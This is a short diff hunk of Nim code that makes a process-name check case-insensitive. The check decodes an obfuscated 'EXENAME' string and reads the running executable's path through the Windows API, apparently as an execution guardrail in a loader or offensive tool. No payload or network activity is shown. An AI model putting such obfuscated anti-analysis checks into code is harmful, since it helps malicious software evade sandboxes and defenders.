@@ -3046,7 +3046,7 @@ proc execute_in(): bool =
     var exe_name: string = obf("EXENAME")
     if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
         let temp_str = $cast[cstring](temp.addr)
-        if temp_str.contains(exe_name):
+        if temp_str.toLower().contains(exe_name.toLower()):
             return false
     return true
 
